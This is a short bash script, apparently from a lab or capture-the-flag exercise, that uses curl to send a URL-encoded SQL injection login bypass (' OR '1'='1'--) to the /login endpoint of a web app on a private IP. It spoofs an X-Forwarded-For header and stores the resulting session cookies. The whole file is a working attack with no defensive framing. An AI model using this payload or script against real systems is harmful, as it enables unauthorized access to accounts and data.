#!/bin/bash
TARGET="http://172.20.10.2:3000"
MY_IP="10.0.0.103"
# username: ' OR '1'='1'--
# password: a
PAYLOAD="username=%27%20OR%20%271%27%3D%271%27--&password=a"

# -L: Follow redirects
# -c cookies.txt: Store cookies in cookies.txt
curl -v -L -c cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: $MY_IP" \
  -d "$PAYLOAD" \
  "$TARGET/login"

